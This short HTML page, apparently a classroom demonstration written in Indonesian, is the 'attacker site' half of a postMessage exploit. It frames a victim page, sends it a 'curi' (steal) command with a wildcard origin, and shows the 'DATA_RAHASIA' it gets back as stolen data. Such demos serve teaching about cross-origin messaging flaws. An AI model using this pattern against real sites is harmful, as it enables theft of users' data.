<!DOCTYPE html>
<html>
<body>
    <h3>Situs Penyerang</h3>
    <button onclick="kirimSerangan()">Curi Data dari Korban</button>
    <div id="log" style="color:red; margin-top:10px;"></div>

    <iframe id="targetIframe" src="korban.html" style="width:100%; height:150px; border:1px solid black;"></iframe>

    <script>
        function kirimSerangan() {
            const iframe = document.getElementById('targetIframe').contentWindow;
            // Mengirim perintah 'curi' ke iframe korban
            iframe.postMessage({ action: "curi" }, "*");
            document.getElementById("log").innerText = "Serangan dikirim...";
        }

        // Menerima data hasil curian
        window.addEventListener("message", (event) => {
            if (event.data.type === "DATA_RAHASIA") {
                document.getElementById("log").innerText = 
                    "BERHASIL! Data dicuri: " + JSON.stringify(event.data.data);
            }
        });
    </script>
</body>
</html>
